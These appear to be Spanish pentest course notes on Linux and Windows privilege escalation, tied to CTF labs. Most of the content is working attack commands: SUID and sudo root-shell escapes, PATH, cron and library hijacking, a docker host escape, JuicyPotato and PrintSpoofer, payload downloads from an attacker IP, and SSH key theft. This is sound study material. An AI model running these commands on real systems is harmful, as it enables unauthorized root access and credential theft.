

> [!info] Relacionado con
> [[Explotación de Servicios - Linux]] · [[Explotación de Servicios - Windows]] · [[Reverse Shells y Post-Explotación]] · [[Linux - Fundamentos]] · [[Pivoting y Movilidad Lateral]] · [[Análisis Forense y Memoria]]

---

## ① Conceptos clave

Después de obtener una shell (normalmente `www-data` o un usuario limitado), hay que **escalar** hasta root/Administrator.

### Tipos de cuenta

| Tipo | Características | Ejemplos |
|------|----------------|---------|
| **Servicio** | Permisos reducidos, sin /home real | www-data, apache |
| **Usuario** | /home propio, shell (/bin/bash) | summer, robert |
| **Administrador** | Máxima autoridad, /root | root |

---

## ② Checklist de escalada (siempre en este orden)

```bash
# 1. ¿Qué puedo ejecutar como root sin contraseña?
sudo -l

# 2. ¿Qué grupos tengo?
id

# 3. ¿Qué binarios tienen SUID?
find / -perm -4000 2>/dev/null

# 4. ¿Qué hay en /etc/crontab?
cat /etc/crontab

# 5. ¿Qué ficheros soy escribible?
find / -writable -type f 2>/dev/null

# 6. ¿Qué versiones de software corren?
uname -a
cat /etc/os-release
```

### Enumeración extendida (cuando el checklist básico no da pistas)

```bash
# Contexto y estabilidad de la shell
whoami && id && uname -a && hostname && ip a
script /dev/null -qc bash

# Procesos (sin los del kernel)
ps aux | grep -v '\['

# Puertos y servicios locales
ss -tulpn

# Directorios y ficheros interesantes
ls -la /root/ /home/*/ 2>/dev/null
find / -writable -type d 2>/dev/null | head
find / -perm -2 -type d 2>/dev/null | grep -v proc | head

# Buscar secretos en configuraciones
grep -R "password|secret|token" -n /etc /opt /var/www /home 2>/dev/null | head
```

> [!note] Si te atascas
> Lanza **LinPEAS desde `/tmp`**: recorre sistemáticamente todos estos vectores y resalta los hallazgos más prometedores. El 80% de la escalada es enumerar bien.

---

## ③ Vector: SUID

Binarios que se ejecutan con los permisos de su propietario (normalmente root).

```bash
# Buscar SUID
find / -perm -4000 2>/dev/null

# Si find tiene SUID → trivial
find / -exec /bin/sh -p \;

# Si python tiene SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# GTFOBins: referencia para abusar de binarios
# https://gtfobins.github.io/
```

### Vector: Capabilities

Capabilities fragmentan los permisos de root: un binario puede tener solo `cap_setuid`, `cap_dac_read_search`, etc.

```bash
# Buscar binarios con capabilities
getcap -r / 2>/dev/null

# Si aparece, por ejemplo, en python/perl/tar/openssl:
# consulta GTFOBins la técnica de "Capabilities" para ese binario
python -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

> [!important] SUID vs Capabilities
> SUID es el bit clásico (4000); capabilities son permisos granulares. Ambos se buscan tras conseguir la primera shell: `find / -perm -4000` **y** `getcap -r /`.

---

## ④ Vector: Secuestro de PATH

Cuando un binario ejecuta un comando **sin ruta absoluta**:

```bash
# Ejemplo: binario bugtracker ejecuta "cat" sin ruta absoluta
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker # ejecuta nuestro "cat" malicioso como root
```

> [!important] POR QUÉ FUNCIONA
> El sistema busca `cat` recorriendo PATH. Al anteponer `/tmp`, encuentra nuestro `cat` falso primero. Como el binario corre como root, nuestra shell también.

### Variantes vistas en clase

**Script hijacking por cronjob** — un script que root ejecuta periódicamente y que podemos modificar:

```bash
# Evidencia: test.txt (propiedad de root) cambia de fecha sin que nadie lo toque
ls -la /scripts/test.txt
# → hay un cron que ejecuta test.py como root

# Sobrescribir el script con una reverse shell (o añadir comandos con >>)
echo 'import socket,subprocess,os;...' > /ruta/script_ejecutado_por_root.py
# Esperar al siguiente ciclo del cron
```

> [!important] La clave de la escalada (clase 02.07)
> `test.txt` es de root, pero `test.py` lo puedo modificar porque **quien ejecuta `test.py` es root** vía cronjob. Metáfora: "es como dejar las llaves del coche en el bolsillo del abrigo del recibidor — el coche es de root, pero cualquiera que entre puede coger las llaves".

**Library hijacking** — un script que importa librerías **por nombre relativo** (no ruta absoluta) es vulnerable:

```bash
# El script de root hace: import psutil
# Colocar nuestra librería maliciosa en una ruta del PATH que se consulte antes
vi /home/usuario/.local/bin/psutil.py
# contenido malicioso → se ejecuta cuando root ejecuta el script
```

> [!tip] Diferencia con PATH hijacking
> En PATH hijacking sustituyes el **comando** que se ejecuta; en library hijacking sustituyes la **librería** que se importa. Misma familia: abuso de rutas de búsqueda.

---

## ⑤ Vector: sudo + GTFOBins

```bash
# Si sudo -l dice que puedes ejecutar vi como root
sudo /bin/vi /ruta/permitida
# Dentro de vi:
:!/bin/bash # → shell como root
```

> [!tip] GTFOBins
> Consulta `gtfobins.github.io` para cada binario. Busca el binario + contexto (sudo, SUID, docker...).

### Alternativas dentro de vi

```
:set shell=/bin/bash
:shell
# → shell como root (mismo efecto que :!/bin/bash)
```

### Vector: sudo NOPASSWD sobre script escribible

Patrón clásico (Nibbles): `sudo -l` muestra `(root) NOPASSWD: /ruta/script.sh` y el script es **escrito por nosotros** (permisos 777):

```bash
# Ver el permiso
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/monitor.sh

# Añadir comando al FINAL (>> = append, nunca >)
echo 'chmod +s /bin/bash' >> personal/monitor.sh

# Ejecutar como root
sudo ./personal/monitor.sh

# /bin/bash queda con SUID → shell root
ls -la /bin/bash   # -rwsr-xr-x
bash -p
```

> [!warning] `>>` vs `>`
> **Siempre `>>`**: `>` sobreescribe y destruye el script legítimo (rompe la cadena y alerta al admin); `>>` añade al final preservando la funcionalidad original.

---

## ⑥ Vector: Grupos peligrosos

| Grupo | Explotación |
|-------|-----------|
| **docker** | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| **lxd** | Crear contenedor con acceso al host |
| **disk** | Leer /etc/shadow directamente |
| **bugtracker** (a medida) | Binario SUID del grupo |

> [!important] LXD en detalle
> Pertenecer al grupo `lxd` permite crear un **contenedor privilegiado que monta el disco del host**, dando escritura como root al sistema de ficheros completo. Mismo patrón que docker pero sin demonio: `lxd init` → crear contenedor con el `/` del host montado → escribir en `/root/.ssh/authorized_keys`.

---

## ⑦ Vector: LinPEAS / WinPEAS

```bash
# Linux
chmod +x linpeas.sh
./linpeas.sh

# Windows
.\winpeas.exe
```

> [!tip] COLORES
> **Rojo + amarillo** = muy interesante, revisar a fondo.
> **Rojo** = revisar.
> El 80% del hacking es **enumerar**.

### Vectores Windows que suele detectar WinPEAS

```bash
whoami /priv   # privilegios habilitados del usuario actual
systeminfo     # versión exacta y arquitectura ANTES de elegir herramienta
```

- **SeImpersonatePrivilege** habilitado → impersonación de tokens: encadenar hasta `NT AUTHORITY\SYSTEM`.
- **JuicyPotato** (hasta Windows 10 / Server 2016, requiere CLSID válido):

```bash
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\out.txt" -t * -c {CLSID}
```

- **PrintSpoofer** — alternativa más moderna, no requiere CLSID:

```bash
PrintSpoofer.exe -i -c cmd
```

> [!note] Sistemas antiguos
> En Windows Server 2003, **Churrasco** explota un CVE específico de esa época.

### Transferencia de archivos en Windows

Windows no siempre trae curl/wget. Alternativas:

```bash
# certutil (puede ser detectado por Defender en sistemas modernos)
certutil -urlcache -split -f http://TU_IP/archivo.exe archivo.exe

# PowerShell
Invoke-WebRequest -Uri http://TU_IP/archivo.exe -OutFile archivo.exe
IWR http://TU_IP/archivo.exe -OutFile archivo.exe
```

### De la enumeración a la acción: credenciales y claves

```bash
# Claves SSH robables
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cp id_rsa /tmp/ && chmod 600 /tmp/id_rsa   # copia con BEGIN/END intactos
ssh -i /tmp/id_rsa usuario@IP

# Crackear /etc/shadow si es legible
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Generar hash para añadir usuario propio en /etc/passwd (si es escribible)
mkpasswd -m sha-512 'nueva_pass'   # formato $6$SALT$HASH
```

---

## ⑧ Conexión con otras áreas

| Área | Cómo encaja |
|------|------------|
| [[Linux - Fundamentos]] | Permisos, SUID, rutas |
| [[Explotación de Servicios - Linux]] | SSH, hashes, escalationes |
| [[Explotación de Servicios - Windows]] | WinPEAS, psexec |
| [[Prácticas CTF - HTB y VulnHub]] | Oopsie, Archetype, Vaccine |

---

## Checklist de repaso

- [ ] ¿Sé ejecutar el checklist de escalada en orden?
- [ ] ¿Entiendo qué es el SUID y cómo explotarlo?
- [ ] ¿Sé ejecutar un secuestro de PATH?
- [ ] ¿Conozco GTFOBins y sé usarlo?
- [ ] ¿Sé interpretar el informe de LinPEAS?
- [ ] ¿Busco también capabilities con `getcap -r /`?
- [ ] ¿Distingo script hijacking (cron) de library hijacking (import)?
- [ ] ¿Aplico el patrón `>>` en scripts NOPASSWD sin romper el original?
- [ ] ¿Sé explotar SeImpersonate con JuicyPotato/PrintSpoofer en Windows?
- [ ] ¿Sé transferir ficheros en Windows con certutil o Invoke-WebRequest?

---

## Enlaces relacionados

- [[comandos/Linux]] — Comandos de referencia
- [[Prácticas CTF - HTB y VulnHub]] — Walkthroughs con escalada









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[../comandos/Netcat.md|Netcat]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Metodologia Pentest, Netcat / Reverse Shells

### 🌐 Cross-Dominio

- [[../../../cloud/docker_compose_cloud.md|docker_compose_cloud]] — Cloud: CLI/Scripting, Linux, Redes
- [[../../../programacion/Linux/fundamentos_linux.md|fundamentos_linux]] — Programacion: CLI/Scripting, Linux, Redes

> #cli #docker #forense #hack_the_box #linux #linux_ciber #metasploit #netcat #pentest #pivoting #post_explotacion #redes #reverse_shell #smb_impacket #ssh_tool #vulnhub #windows_ciber
